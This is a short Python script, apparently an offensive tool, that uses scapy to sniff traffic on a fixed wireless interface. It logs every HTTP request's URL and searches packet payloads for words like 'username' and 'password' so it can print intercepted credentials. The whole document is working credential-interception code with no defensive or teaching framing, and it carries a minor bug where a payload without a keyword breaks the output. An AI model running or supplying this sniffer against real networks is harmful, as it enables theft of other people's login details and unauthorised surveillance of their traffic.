#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import re

def sniffer(interface):
    scapy.sniff(iface=interface, prn=processing_sniffer, store=False)

def processing_sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)

        if packet.haslayer(scapy.Raw):
            login_info = get_credentials_from_http(packet)
            print("\n[+++] Possible credentials found..\n" + login_info + "\n")

def get_url(packet):
    binary_url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return re.search("(?:')(.*?)'", str(binary_url))[1]

def get_credentials_from_http(packet):
    keywords = ["username", "uname", "us", "user", "name", "password", "pass", "passwd", "pw"]
    load = str(packet[scapy.Raw].load)
    for keyword in keywords:
        if keyword in load:
            return re.search("(?:')(.*?)'", str(load))[1]
            # x = re.search(pattern, string)

sniffer("wlp2s0")